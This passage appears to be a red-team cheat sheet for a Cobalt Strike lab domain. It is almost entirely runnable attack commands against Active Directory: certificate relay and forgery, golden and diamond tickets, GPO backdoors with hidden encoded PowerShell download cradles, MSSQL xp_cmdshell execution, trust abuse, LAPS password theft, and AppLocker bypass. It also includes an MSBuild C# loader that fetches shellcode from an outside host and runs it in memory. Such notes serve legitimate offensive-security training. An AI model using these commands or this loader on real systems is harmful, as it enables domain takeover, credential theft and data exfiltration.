ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap

# Attack Case 2 : NTLMRelay on CA web endpoint

# NTLM Relaying to ADCS HTTP Endpoints
- Web End point for certificate services is at http[s]://<hostname>/certsrv.
- Redirect the NTLM auth traffic using PrintSpool attack from DC to CA (if services running on seperate system) to fetch the DC Certificate
- But if they are both running on same server then we can execute the attack targetting a system where unconstrained delegation (WEB) is allowed, and force it to authenticate with CA to capture its certificate
- Do the same setup for ntlmrelayx and use print spooler to force DC/WEB to authenticate with wkstn2

1. Setup socks proxy (beacon session)
beacon> socks 1080 socks5 disableNoAuth socks_user socks_password enableLogging

2. Setup Proxychains to use this proxy
$ sudo vim /etc/proxychains.conf
socks5 127.0.0.1 1080 socks_user socks_password

3. Execute NTLMRelayx to target the certificate server endpoint
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

4. Setup reverse port forwarding (System shell)
beacon> rportfwd 8445 127.0.0.1 445

5. Upload PortBender driver and load its cna file (System shell)
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
beacon> PortBender redirect 445 8445

6. Use PrintSpool attack to force WEB (unconstrained) server to authenticate with wkstn 2 (Domain Sesion)
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102

7. Use the Base64 encoded machine certificate obtained to get TGT of machine account
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /nowrap

8. Use the TGT ticket obtained for S4U attack to get a service ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

9. Inject the Service Ticket by creating a new sacrificial token
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

10. Steal token and access the service
beacon> steal_token 1234
beacon> ls \\web.dev.cyberbotic.io\c$

## User and Computer Persistance

# User Persistance

1. Enumerate user certificate from their Personal Certificate store (execute from user session)
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

2. Export the certificate as DER and PFX file on disk
beacon> mimikatz crypto::certificates /export

3. Encode the PFX file to be used with Rubeus
ubuntu@DESKTOP-3BSK7NO ~> cat /mnt/c/Users/Attacker/Desktop/CURRENT_USER_My_0_Nina\ Lamb.pfx | base64 -w 0

4. Use certificate to request TGT for the user (/enctype:aes256 - Better OPSEC)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /certificate:MIINeg[...]IH0A== /password:mimikatz /enctype:aes256 /nowrap

5. if certificate is not present then requst from his loggedin session and then follow above steps
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:User

# Computer Persistance 

1. Export the machine certificate (requires elevated session)
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

2. Encode the certificate, and use it to get TGT for machine account
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

3. If machine certificate it not stored, we can requet it using Certify (/machine param is required for auto elevation to system privilege)
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine

```

### Group Policy

```powershell

# Modify Existing GPO

1. Identify GPO where current principal has modify rights
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

2. Resolve GPOName, Path and SID of principal
beacon> powerpick Get-DomainGPO -Identity "CN={AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath

beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}

3. Identify the domain OU where the above GPO applies
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName

4. Identify the systems under the given OU
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

5. Setup a pivot listener(1234) on the beacon, and download & execute cradle pointing to pivot (80)
PS> IEX ((new-object net.webclient).downloadstring("http://wkstn-2:8080/pivot"))

6. Enable inbound traffic on Pivot Listener (1234) and WebDrive by ports (8080) (requires system access)
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 1234
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

7. Setup port forwarding rule to accept the Payload Download request locally and forward to our team server 
beacon> rportfwd 8080 127.0.0.1 80

8. Use sharpGPOAbuse to add the backdoor (scheduled task) for execution on targetted system
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwB3AGsAcwB0AG4ALQAyADoAOAAwADgAMAAvAHAAaQB2AG8AdAAiACkAKQA=" --GPOName "Vulnerable GPO"

# Create and Link new GPO

1. Check the rights to create a new GPO in Domain
beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

2. Find the OU where any principal has "Write gPlink Privilege"
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
DEV\Developers

3. Verify if RSAT module is installed for GPO abuse
beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

4. Create a new GPO & configure it to execute attacker binary via Registry loaded from shared location
beacon> powerpick New-GPO -Name "Evil GPO"

beacon> powerpick Find-DomainShare -CheckShareAccess
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\pivot.exe
beacon> powerpick Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString

5. Link newly created GPO with OU
beacon> powerpick Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

```

### MSSQL Servers

```powershell

# Use PowerUpSQL for enumerating MS SQL Server instances
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
beacon> powerpick Get-SQLInstanceDomain

# Check access to DB instance with current user session
beacon> powerpick Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
beacon> powerpick Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Query execution
beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

# Command Execution
beacon> powerpick Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults

# Interactive access and RCE (xp_cmdshell 0 means it is disabled, needs to be enabled)
ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25 -debug

SQL> EXEC xp_cmdshell 'whoami';
SQL> SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';
SQL> sp_configure 'Show Advanced Options', 1; RECONFIGURE;
SQL> sp_configure 'xp_cmdshell', 1; RECONFIGURE;

SQL> EXEC xp_cmdshell 'powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBwAGkAdgBvAHQAIgApAA==';

# Lateral Movement (using DB Links)
beacon> powerpick Get-SQLServerLink -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
beacon> powerpick Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433" -Query "exec master..xp_cmdshell 'whoami'"

SQL> SELECT * FROM master..sysservers;
SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');
SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');

SQL> EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
SQL> EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]

SQL> SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHAAaQB2AG8AdAAyACIAKQA=''')

# MSSQL PrivEsc - Service Account (SeImpersonate) to System 

beacon> getuid
beacon> shell whoami /priv
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAHQAYwBwAC0AbABvAGMAYQBsACIAKQA="

beacon> connect localhost 4444
```

### Domain Dominance

```
psexec |  CIFS 
winrm  |  HOST & HTTP 
dcsync (DCs only) | LDAP
```

```powershell

# Silver Ticket (offline)

1. Fetch the kerberos ekeys using mimikatz
beacon> mimikatz !sekurlsa:ekeys

2. Generate the silver Ticket TGS offline using Rubeus (use /rc4 flag for NTLM hash)
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:c9e598cd2a9b08fe31936f2c1846a8365d85147f75b8000cbc90e3c9de50fcc7 /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3. Inject the ticket and Verify the access 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon> steal_token 5668
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$

# Golden Ticket (offline)

1. Fetch the NTLM/AES hash of krbtgt account
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

2. Generate Golden ticket offline using Rubeus
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

3. Inject golden ticket and gain acess
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# Diamond Ticket (online)

1. Fetch the SID of Ticket User
beacon> powerpick ConvertTo-SID dev/nlamb

2. Create Diamond ticket (512 - Enterprise Group ID, krbkey - Hash of KRBRGT account)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

3. Verify the specs of Diamond ticket vs Golden ticket
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

# Forged certificates (DC or CA Server)

1. Dump the Private Key and Certificate of CA (to be executed on DC/CA)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

2. Save the certificate in .pem file and convert into pfx format using openssl
ubuntu@DESKTOP-3BSK7NO ~> openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

3. Next, use the stolen CA cert to generate fake cert for nlamb user
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

4. Encode the certificate
ubuntu@DESKTOP-3BSK7NO ~> cat cert.pfx | base64 -w 0

5. Use the certificate to get TGT for nlamb user
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap

6. Inject the ticket and access the service
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$

```

### Forest & Domain Trusts

```powershell

# Enumerate the Domain Trust (Use -Domain attribute to enumerate other domains)
beacon> powerpick Get-DomainTrust

## PrivEsc : Child (DEV.CYBERBOTIC.IO) to Parent (CYBERBOTIC.IO) within Same Domain via SID History

# Enumerate basic info required for creating forged ticket
beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid
beacon> powerpick Get-DomainController -Domain cyberbotic.io | select Name
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain cyberbotic.io | select MemberName

# Use Golden Ticket technique
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

# Or, Use Diamond Ticket technique
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

# Inject the ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-1.cyberbotic.io\c$
beacon> jump psexec64 dc-1.cyberbotic.io PeerSambhar
beacon> dcsync cyberbotic.io cyber\krbtgt

## Exploiting Inbound Trusts (Users in our domain can access resources in foreign domain) 

# We can enumerate the foreign domain with inbound trust
beacon> powerpick Get-DomainTrust
beacon> powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

# Check if members in current domain are part of any group in foreign domain
beacon> powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
beacon> powerpick Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
beacon> powerpick Get-DomainController -Domain dev-studio.com | select Name

# Fetch the AES256 hash of nlamb user identfied in previous steps
beacon> dcsync dev.cyberbotic.io dev\nlamb

# We can create Inter-Realm TGT for user identified in above steps (/aes256 has users hash)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

# Inject the ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc.dev-studio.com\c$

## Exploiting Outbound Trusts (Users in other domain can access resources in our domain)

# Enumerate the outbound trust (msp.com) in parent domain (cyberbotic.io)
beacon> powerpick Get-DomainTrust -Domain cyberbotic.io

# Enumerate the TDO to fetch the shared trust key 
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

# To be execute on the DC having outbound trust
beacon> run hostname 
beacon> mimikatz lsadump::trust /patch

# OR, Use DCSync to get the ntlm hash of TDO object remotely
beacon> powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

# There is a "trust account" which gets created in trusted domain (msp.com) by the name of trusting domain (CYBER$), it can be impersonated to gain normal user access (/rc4 is the NTLM hash of TDO Object)

beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:f3fc2312d9d1f80b78e67d55d41ad496 /nowrap

# Inject the ticket
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

beacon> steal_token 5060
beacon> run klist
beacon> powerpick Get-Domain -Domain msp.org

```

### LAPS

```powershell

# Check for presence of LAPS 

# LAPS client installed on local machine
beacon> ls C:\Program Files\LAPS\CSE

# Computer Object having ms-Mcs-AdmPwd and ms-Mcs-AdmPwdExpirationTime attribute set
powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# LAPS configuration deplayed through GPO
beacon> powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Download LAPS configuration
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

# Parse the LAPS GPO Policy file downloaded in previous step 
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

# Identify the principals who have read right to LAPS password

beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107

# Use Laps Toolkit to identify Groups & Users who can read LAPS password
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powerpick Find-LAPSDelegatedGroups
beacon> powerpick Find-AdmPwdExtendedRights

# View the LAPS password for given machine (From User Session having required rights)
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime

# Use the laps password to gain access
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
beacon> ls \\wkstn-1\c$

# Set Far Future date as expiry (Only machine can set its Password)
beacon> powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose

# LAPS Backdoor
- Modify the AdmPwd.PS.dll and AdmPwd.Utils.dll file located at C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\ location to log the LAPS password everytime it is viewed by the admin user

```

### AppLocker

```powershell

# Enumerate the Applocker policy via GPO
beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol

PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol

# Enumerate the Applocker policy via Local Windows registry on machine 
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

# Using powershell on local system
PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

# Navigating Laterally via PSEXEC is fine, as service binary is uploaded in C:\Winodws path which is by default whitelisted

# Find the writable path within C:\winodws to bypass Applocker
beacon> powershell Get-Acl C:\Windows\Tasks | fl
```

```
# LOLBAS
# Use MSBuild to execute C# code from a .csproj or .xml file
# Host http_x64.xprocess.bin via Site Management > Host File
# Start execution using C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj

<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

```

```powershell

# break out of PowerShell Constrained Language Mode by using an unmanaged PowerShell runspace
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage

beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

# Beacon DLL (DLLs are usually not restricted by Applocker due to performance reason)
C:\Windows\System32\rundll32.exe http_x64.dll,StartW

```

### Data Exfiltration

```powershell

# Find shares on hosts in current domain.
Invoke-ShareFinder -Verbose

# Find sensitive files on computers in the domain
Invoke-FileFinder -Verbose

# Get all fileservers of the domain
Get-NetFileServer

# Enumerate Share
beacon> powerpick Invoke-ShareFinder
beacon> powerpick Invoke-FileFinder
beacon> powerpick Get-FileNetServer
beacon> shell findstr /S /I cpassword \\dc.organicsecurity.local\sysvol\organicsecurity.local\policies\*.xml
beacon> Get-DecryptedCpassword

# Find accessible share having juicy information
beacon> powerpick Find-DomainShare -CheckShareAccess
beacon> powerpick Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*
beacon> powerpick gc \\fs.dev.cyberbotic.io\finance$\export.csv | select -first 5

# Search for senstive data in directly accessible DB by keywords
beacon> powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "email,address,credit,card" -SampleSize 5 | select instance, database, column, sample | ft -autosize

# Also works with Get-SQLServerLinkCrawl

#View all db in an instance
Get-SQLQuery -Instance <instanceName> -Query "SELECT name FROM sys.databases"

#View all tables
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.TABLES" 

#View all cols in all tables in a db
Get-SQLQuery -Instance <instanceName> -Query "SELECT * FROM dbName.INFORMATION_SCHEMA.columns"

#View data in table
Get-SQLQuery -Instance <instanceName> -Query "USE dbName;SELECT * FROM tableName"



# Search for senstive data in DB links
beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns where table_name=''employees''')"

beacon> powerpick Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 first_name,gender,sort_code from master.dbo.employees')"
```

```
# Not able to migrate to another process using Inject Command (worked by choosing P2P beacon)

# Was facing some issues with doing the lateral movement by SYSTEM User
- But if we have access to NTLM hash, we can directly use PTH and JUMP to move laterally 
